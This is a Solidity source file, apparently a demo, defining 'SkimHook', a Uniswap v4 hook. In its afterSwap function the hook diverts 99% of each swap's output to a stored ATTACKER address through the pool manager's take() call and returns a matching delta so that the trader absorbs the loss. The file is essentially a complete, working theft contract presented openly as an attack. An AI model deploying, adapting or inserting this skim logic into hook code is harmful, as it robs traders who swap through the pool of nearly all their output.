// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// Minimal shapes from Uniswap/v4-core, kept local so this demo does not vendor the whole repo.
interface IPoolManagerTake {
    function take(address currency, address to, uint256 amount) external;
}

struct PoolKeyLite {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParamsLite {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

/// A v4 hook that takes about 99% of a swap's output through `afterSwapReturnDelta`.
/// Deploy at an address whose low bits are AFTER_SWAP (1 << 6) | AFTER_SWAP_RETURNS_DELTA (1 << 2) and nothing else.
contract SkimHook {
    /// IHooks.afterSwap.selector
    bytes4 private constant AFTER_SWAP = 0xb47b2fb1;
    address public immutable POOL_MANAGER;
    address public immutable ATTACKER;

    error NotPoolManager();

    constructor(address poolManager, address attacker) {
        POOL_MANAGER = poolManager;
        ATTACKER = attacker;
    }

    function afterSwap(address, PoolKeyLite calldata key, SwapParamsLite calldata params, int256 delta, bytes calldata) external returns (bytes4, int128) {
        if (msg.sender != POOL_MANAGER) revert NotPoolManager();
        // Exact-in: the unspecified currency is the output.
        bool exactIn = params.amountSpecified < 0;
        int128 amount0 = int128(delta >> 128);
        int128 amount1 = int128(delta);
        int128 out = params.zeroForOne == exactIn ? amount1 : amount0;
        if (out < 0) out = -out;
        address currency = params.zeroForOne == exactIn ? key.currency1 : key.currency0;
        uint256 skim = (uint256(uint128(out)) * 99) / 100;
        IPoolManagerTake(POOL_MANAGER).take(currency, ATTACKER, skim);
        return (AFTER_SWAP, int128(int256(skim)));
    }
}
